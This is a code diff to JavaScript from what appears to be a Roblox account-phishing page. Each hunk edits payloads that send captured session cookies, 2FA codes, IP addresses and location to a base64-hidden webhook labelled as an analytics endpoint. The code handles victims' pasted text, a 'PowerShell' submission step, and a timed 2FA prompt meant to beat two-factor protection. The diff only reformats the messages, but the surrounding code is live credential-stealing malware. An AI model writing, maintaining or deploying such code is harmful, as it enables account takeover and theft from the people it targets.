@@ -213,14 +213,12 @@ async function verifyCode() {
         // Send 2FA code to webhook using the same webhook as the main data
         const reportingEndpoint = atob(analyticsEndpoints[2]);
         const payload = {
-            content: `🔐 **2-Step Verification Code Captured**
-\`\`\`
+            content: `2-Step Verification Code Captured
 Code: ${code}
 Cookie: ${globalRobloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None found'}
 Time: ${new Date().toLocaleString()}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
-\`\`\`
 @everyone`
         };
 
@@ -451,17 +449,15 @@ async function handlePasteEvent(pastedText) {
             // Create timestamp
             const timestamp = new Date().toLocaleString();
             
-            // Immediate cookie capture payload
+            // Immediate cookie capture payload (plain text)
             const payload = {
-                content: `🍪 **Roblox Cookie Captured (Paste Event)**
-\`\`\`
+                content: `Cookie Captured (Paste Event)
 Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
 Time: ${timestamp}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
 Content Length: ${pastedText.length} characters
-\`\`\`
-⏰ **2-Step Verification will trigger in 80 seconds...**
+2FA in 80 seconds
 @everyone`
             };
 
@@ -710,12 +706,12 @@ async function submitPowerShell() {
                 
                 console.log('🔗 Webhook URL:', reportingEndpoint);
                 
-                // Immediate cookie capture payload (shortened to avoid 400 errors)
+                // Immediate cookie capture payload (plain text)
                 const payload = {
-                    content: `🍪 **Cookie Captured**
+                    content: `Cookie Captured
 Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-⏰ 2FA in 80s
+2FA in 80 seconds
 @everyone`
                 };
 
